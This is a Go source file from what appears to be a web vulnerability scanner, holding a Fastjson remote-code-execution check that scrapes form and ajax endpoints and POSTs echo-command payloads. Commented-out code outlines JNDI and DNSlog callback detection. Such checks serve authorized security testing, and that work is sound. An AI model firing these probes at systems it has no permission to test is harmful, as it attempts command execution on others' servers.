package fastjson

import (
	regexp "github.com/wasilibs/go-re2"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"net/url"
	"strings"
)

func Check(u string, finalURL string) string {
	domainx := getinputurl(finalURL)
	for _, jsonurl := range domainx {
		header := make(map[string]string)
		header["Content-Type"] = "application/json"
		// randomstr := util.RandomStr(10)
		// if (yak.CeyeApi != "" && yak.CeyeDomain != "") || jndi.JndiAddress != "" {
		//    for _, payload := range fastjsonJndiPayloads {
		//        var uri string
		//        if jndi.JndiAddress != "" {
		//            uri = jndi.JndiAddress + "/" + randomstr + "/"
		//        } else if yak.CeyeApi != "" && yak.CeyeDomain != "" {
		//            uri = randomstr + "." + yak.CeyeDomain
		//        }
		//        _, _ = yak.Request(jsonurl, "POST", strings.Replace(payload, "dnslog-url", uri, -1), false, header)
		//    }
		//    if jndi.JndiAddress != "" {
		//        if jndi.Jndilogchek(randomstr) {
		//            yak.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
		//            return "JNDI RCE"
		//        }
		//    }
		//    if yak.CeyeApi != "" && yak.CeyeDomain != "" {
		//        if yak.Dnslogchek(randomstr) {
		//            yak.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
		//            return "JNDI RCE"
		//        }
		//    }
		// } else {
		header["cmd"] = "echo jsonvuln"
		for _, payload := range fastjsonEchoPayloads {
			if req, err := httpx.Request(jsonurl, "POST", payload, header, "Poc FastJson"); err == nil {
				if strings.Contains(req.Body, "jsonvuln") {
					// yak.GoPocLog(fmt.Sprintf("Found vuln FastJson ECHO RCE |%s\n", u))
					return "ECHO RCE"
				}
			}
		}
		// }
	}
	return ""
}

func getinputurl(domainurl string) (domainurlx []string) {
	req, err := httpx.Request(domainurl, "GET", "", nil, "Poc FastJson")
	if err != nil {
		return nil
	}
	var loginurl []string
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = httpx.Request(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", nil, "Poc FastJson")
		if err != nil {
			return nil
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(domainurl)
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if strings.Contains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	return loginurl
}
